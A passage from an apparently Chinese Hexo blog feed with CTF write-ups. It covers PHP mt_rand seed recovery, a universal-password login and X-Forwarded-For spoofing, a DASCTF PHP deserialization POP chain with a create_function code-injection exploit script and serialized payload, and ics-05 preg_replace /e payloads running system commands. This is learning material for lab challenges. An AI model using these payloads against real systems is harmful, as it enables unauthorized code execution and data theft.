class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;</span><br><span class="line">    char *str2 &#x3D; &quot;KVQP0LdJKRaV3n9D&quot;; &#x2F;&#x2F;公钥</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; strlen(str2) ; i++) &#123;</span><br><span class="line">        for (int j &#x3D; 0; j &lt; strlen(str1) ; j++) &#123;</span><br><span class="line">            if ( str2[i] &#x3D;&#x3D; str1[j] ) &#123;</span><br><span class="line">                printf(&quot;%d %d 0 %d &quot;, j, j, strlen(str1)-1);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929162312335.png" alt="image-20210929162312335"></p><p><img src="/2021/09/28/buu/24/image-20210929162350213.png" alt="image-20210929162350213"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(1775196155);</span><br><span class="line"></span><br><span class="line">function public_key($length &#x3D; 16) &#123;</span><br><span class="line">    $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $public_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;genarate private_key</span><br><span class="line">function private_key($length &#x3D; 12) &#123;</span><br><span class="line">    $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $private_key &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">&#125;</span><br><span class="line">$Public_key &#x3D; public_key();</span><br><span class="line">$y1ng &#x3D; private_key();</span><br><span class="line">echo $Public_key . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $y1ng;</span><br></pre></td></tr></table></figure><p>得到私钥：XuNhoueCDCGc</p><p>有了这个，嘿嘿嘿，可以为所欲为了（不是）</p><h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>万能密码走起</p><p><img src="/2021/09/28/buu/24/image-20210929162457871.png" alt="image-20210929162457871"></p><p>登录后：</p><p><img src="/2021/09/28/buu/24/image-20210929162522508.png" alt="image-20210929162522508"></p><h2 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h2><p>啊，这题感觉有点小无语</p><p><img src="/2021/09/28/buu/24/image-20210929163657423.png" alt="image-20210929163657423"></p><p>进去之后发现被出题人疯狂嘲讽</p><p><img src="/2021/09/28/buu/24/image-20210929163738713.png" alt="image-20210929163738713"></p><p>扫这个就被嘲讽还想py？</p><h4 id="md5失败"><a href="#md5失败" class="headerlink" title="md5失败"></a>md5失败</h4><p>老老实实回去页面</p><p><img src="/2021/09/28/buu/24/image-20210929163835193.png" alt="image-20210929163835193"></p><p>源码里看到这段代码</p><p>我试了半天的md5加密，结果wp和我说这，是，解，不，出，来，的！</p><p>直接访问/flag.php就可以了（不争气的泪水流了下来）</p><p><img src="/2021/09/28/buu/24/image-20210929164028325.png" alt="image-20210929164028325"></p><p>然后就是这个帅气的表情包</p><p>到这边完全没有思路</p><h4 id="大佬的解题"><a href="#大佬的解题" class="headerlink" title="大佬的解题"></a>大佬的解题</h4><p>Y1ng大佬说是去看js文件</p><p>发现lib/php-mail-form/validate.js中的 JQuery 会发一个 POST 请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var action &#x3D; $(this).attr(&#39;action&#39;);</span><br><span class="line">    if( ! action ) &#123;</span><br><span class="line">      action &#x3D; &#39;contactform&#x2F;contactform.php&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var this_form &#x3D; $(this);</span><br><span class="line">    this_form.find(&#39;.sent-message&#39;).slideUp();</span><br><span class="line">    this_form.find(&#39;.error-message&#39;).slideUp();</span><br><span class="line">    this_form.find(&#39;.loading&#39;).slideDown();</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">      type: &quot;POST&quot;,</span><br><span class="line">      url: action,</span><br><span class="line">      data: str,</span><br><span class="line">      success: function(msg) &#123;</span><br><span class="line">        if (msg &#x3D;&#x3D; &#39;OK&#39;) &#123;</span><br><span class="line">          this_form.find(&#39;.loading&#39;).slideUp();</span><br><span class="line">          this_form.find(&#39;.sent-message&#39;).slideDown();</span><br><span class="line">          this_form.find(&quot;input, textarea&quot;).val(&#39;&#39;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          this_form.find(&#39;.loading&#39;).slideUp();</span><br><span class="line">          this_form.find(&#39;.error-message&#39;).slideDown().html(msg);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>但是请求的目标 contactform/contactform.php 是不存在的，怀疑出题人前段一键白嫖的时候没有仔细检查。</p><p>访问 flag.php 告诉还没买，已经记录了购买者的 ip</p><p>分析代码可知前段那个授权码验证肯定是无效的（就算验证通过后端也不知道），所以购买 flag 肯定是假的。因为记录了购买者的 ip，所以 XFF 伪造一下，得到 flag</p><p><img src="/2021/09/28/buu/24/image-20210929164307294.png" alt="image-20210929164307294"></p><p><img src="/2021/09/28/buu/24/image-20210929164320367.png" alt="image-20210929164320367"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    参考了Y1ng大佬的博客：&lt;a href=&quot;https://www.gem-love.com/ctf/2184.html&quot;&gt;https://www.gem-love.com/ctf/2184.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;真的写得很棒，看着十分舒服，还在评论区提</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF hellounser</title>
    <link href="http://daweitech.github.io/2021/09/25/buu/23/"/>
    <id>http://daweitech.github.io/2021/09/25/buu/23/</id>
    <published>2021-09-25T12:02:32.000Z</published>
    <updated>2021-09-26T13:16:27.945Z</updated>
    
    <content type="html"><![CDATA[<p> 源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    $aaa = unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    $aaa();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="类A"><a href="#类A" class="headerlink" title="类A"></a>类A</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo $this-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类A比较简单</p><p>先定义公共变量</p><h6 id="PHP中的-this用法："><a href="#PHP中的-this用法：" class="headerlink" title="PHP中的$this用法："></a>PHP中的$this用法：</h6><p>this是指向当前对象的指针</p><p><img src="/2021/09/25/buu/23/image-20210925201706608.png" alt="image-20210925201706608"></p><h6 id="invoke-函数"><a href="#invoke-函数" class="headerlink" title="__invoke()函数"></a>__invoke()函数</h6><p>当以函数方式调用对象时被调用</p><h5 id="类B"><a href="#类B" class="headerlink" title="类B"></a>类B</h5><pre><code>class B&#123;    public $func;    public $arg;public function show()&#123;    $func = $this-&gt;func;    if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $this-&gt;func) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $this-&gt;arg)) &#123;        die(&#39;No!No!No!&#39;);    &#125; else &#123;        include &quot;flag.php&quot;;        //There is no code to print flag in flag.php        $func(&#39;&#39;, $this-&gt;arg);    &#125;&#125;public function __toString()&#123;    $this-&gt;show();    return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;;&#125;&#125;</code></pre><h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><p>当对象为字符串时触发</p><p>思路：</p><p>new两个新的a类和b类变量</p><p>然后b类调用create_function函数方法：</p><p><code>create_function()</code>会创建一个匿名函数（<code>lambda</code>样式）。</p><p>create_function()函数会在内部执行 eval()<a href="https://www.cnblogs.com/-qing-/p/10816089.html">代码审计之create_function()函数 - 卿先生 - 博客园 (cnblogs.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure><p>变量b赋值<br>}这个是为了闭合前面的<br>//这个是为了注释后面的</p><p>base64绕过正则过滤，var_dump输出数据，get_defined_vars()函数返回由所有已定义变量所组成的数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a-&gt;var&#x3D;$b;</span><br></pre></td></tr></table></figure><p>将b的值与a联系，触发_invoke函数从而触发show()</p><p>最后再序列化a</p><p>不过我们得先找到flag到底在哪个文件里：</p><p>经过热心同学的帮助，今天才懂得 include flag.php 包含的意思</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">就相当于现在flag.php里面的变量已经同步到我现在这个php文件里面</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">比如说我在1.php 写include “flag.php”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">那么这个时候</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.php里面定义过的变量还有函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我在1.php里面也可以用</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以在赋值时先直接打印当前php文件的变量值(也就是相当于打印flag.php里的内容)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b-&gt;arg&#x3D;&quot;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/25/buu/23/image-20210926192749869.png" alt="image-20210926192749869"></p><p>放上exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $func;</span><br><span class="line">    <span class="keyword">public</span> $arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="keyword">$this</span>-&gt;func) || preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#x27;</span>, <span class="keyword">$this</span>-&gt;arg)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No!No!No!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">            <span class="comment">//There is no code to print flag in flag.php</span></span><br><span class="line">            $func(<span class="string">&#x27;&#x27;</span>, <span class="keyword">$this</span>-&gt;arg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;show();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Nice Job!!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;func=<span class="string">&quot;create_function&quot;</span>;</span><br><span class="line">$b-&gt;arg=<span class="string">&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;</span>;</span><br><span class="line">$a-&gt;var=$b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跑出pop链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:15:&quot;create_function&quot;;s:3:&quot;arg&quot;;s:73:&quot;&#125;require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;&quot;;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/09/25/buu/23/image-20210925200601616.png" alt="image-20210925200601616"></p><p>之后再看看这篇文章</p><p>[php反序列化之pop链_L1ni01-CSDN博客_pop链](<a href="https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://blog.csdn.net/weixin_45785288/article/details/109877324#:~:text=POP链介绍</a> POP 面向属性编程 (Property-Oriented,Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是 从现有运行环境 中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链%2C最终达到攻击者邪恶的目的)</p><p>经过提示知道这题和BJDCTF的ezphp很像</p><h4 id="BJDCTF-Ezphp"><a href="#BJDCTF-Ezphp" class="headerlink" title="BJDCTF Ezphp"></a>BJDCTF Ezphp</h4><p>[<a href="https://www.cnblogs.com/rabbittt/p/13323155.html">BJDCTF2020]EzPHP - Rabbittt - 博客园 (cnblogs.com)</a></p><p>这一篇文章解释了前面闭合的问题:</p><p><img src="/2021/09/25/buu/23/image-20210926202437436.png" alt="image-20210926202437436"></p><p>这样代码实际就只执行了return $arg  这一句，完成了逃逸</p><p><strong>PHP 的 <code>create_function()</code> 代码注入</strong></p><p><a href="https://www.gem-love.com/ctf/770.html">2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L’Amore (gem-love.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>ics-05&amp;&amp;mfw</title>
    <link href="http://daweitech.github.io/2021/09/23/web/1/"/>
    <id>http://daweitech.github.io/2021/09/23/web/1/</id>
    <published>2021-09-23T12:46:18.000Z</published>
    <updated>2021-09-24T12:17:41.921Z</updated>
    
    <content type="html"><![CDATA[<p> 简略说下思路</p><h4 id="ics-05："><a href="#ics-05：" class="headerlink" title="ics-05："></a>ics-05：</h4><p>这题应该算很早之前写过了，结果又忘了。。。</p><p>在一个页面里有着变量page可控</p><p><img src="/2021/09/23/web/1/image-20210924195014659.png" alt="image-20210924195014659"></p><p>然后用php伪协议读取下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:filter<span class="comment">//read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924195146901.png" alt="image-20210924195146901"></p><p>解码后</p><p>选取重要的来说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$pattern = $_GET[pat];</span><br><span class="line">$replacement = $_GET[rep];</span><br><span class="line">$subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">    preg_replace($pattern, $replacement, $subject);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提示我们用xff头绕过</p><p>同时利用preg_replace函数的漏洞</p><p>preg_replace( pattern , replacement , subject ) :</p><p>当preg_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行（相当于eval漏洞执行）</p><h5 id="preg-repleace漏洞详情"><a href="#preg-repleace漏洞详情" class="headerlink" title="preg_repleace漏洞详情"></a>preg_repleace漏洞详情</h5><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() /e代码执行漏洞_2021！的博客-CSDN博客</a></p><p>于是构造payload</p><p>之后get型变量来读文件</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;ls&quot;)&amp;sub&#x3D;txt</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924200141437.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat&#x3D;&#x2F;txt&#x2F;e&amp;rep&#x3D;system(&quot;cat+s3chahahaDir&#x2F;flag&#x2F;flag.php&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/web/1/image-20210924200335525.png" alt="image-20210924200141437"></p><h4 id="mfw："><a href="#mfw：" class="headerlink" title="mfw："></a>mfw：</h4><p>这题试着解了下</p><p>按照源码提示秘密在?page=flag</p><p>于是访问，没什么发现</p><p><img src="/2021/09/23/web/1/image-20210924200629448.png" alt="image-20210924200629448"></p><p>我突发奇想用目录遍历</p><p><img src="/2021/09/23/web/1/image-20210924200718261.png" alt="image-20210924200718261"></p><p>好家伙，页面回显发现黑客警告，肯定被过滤了</p><p>这时候采用dirsearch扫描，果然有了.git泄露</p><p>所以再使用工具GitHack下载源码</p><p><img src="/2021/09/23/web/1/image-20210924200852766.png" alt="image-20210924200852766"></p><p>看看代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span 